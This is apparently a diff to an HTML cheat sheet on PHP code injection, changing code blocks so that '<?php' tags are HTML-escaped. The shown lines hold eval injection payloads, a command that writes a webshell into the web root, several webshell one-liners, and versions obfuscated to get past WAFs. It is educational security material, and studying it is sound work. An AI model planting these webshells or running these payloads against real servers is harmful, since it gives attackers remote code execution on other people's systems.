@@ -82,7 +82,7 @@ eval("return " . $_GET['calc'] . ";");
 
 // Payload: code=system('id');
 // Payload: code=phpinfo();
-// Payload: code=file_put_contents('/var/www/html/shell.php','<?php system($_GET[c]);?>');</code></pre>
+// Payload: code=file_put_contents('/var/www/html/shell.php','&lt;?php system($_GET[c]);?&gt;');</code></pre>
 
             <h3>assert() as a Code Executor</h3>
             <p>In PHP 5 and early PHP 7, <code>assert()</code> evaluates its argument as PHP code if it's a string. This is a common bypass for WAFs filtering <code>eval()</code>.</p>
@@ -139,14 +139,14 @@ $ffi->system("id > /tmp/out");
 // Automate with FuckFastcgi / Chankro tools</code></pre>
 
             <h3>PHP Webshells — One-liners to Know</h3>
-            <pre><code><?php system($_GET['c']); ?>
-<?php echo shell_exec($_REQUEST['cmd']); ?>
-<?php @eval($_POST['x']); ?>
-<?php passthru(base64_decode($_GET['c'])); ?>
+            <pre><code>&lt;?php system($_GET['c']); ?&gt;
+&lt;?php echo shell_exec($_REQUEST['cmd']); ?&gt;
+&lt;?php @eval($_POST['x']); ?&gt;
+&lt;?php passthru(base64_decode($_GET['c'])); ?&gt;
 
 // Obfuscated (bypass simple WAFs)
-<?php $f='sys'.'tem'; $f($_GET['c']); ?>
-<?php call_user_func(base64_decode('c3lzdGVt'), $_GET['c']); ?></code></pre>
+&lt;?php $f='sys'.'tem'; $f($_GET['c']); ?&gt;
+&lt;?php call_user_func(base64_decode('c3lzdGVt'), $_GET['c']); ?&gt;</code></pre>
 
             <h3>Prevention</h3>
             <pre><code>// php.ini hardening
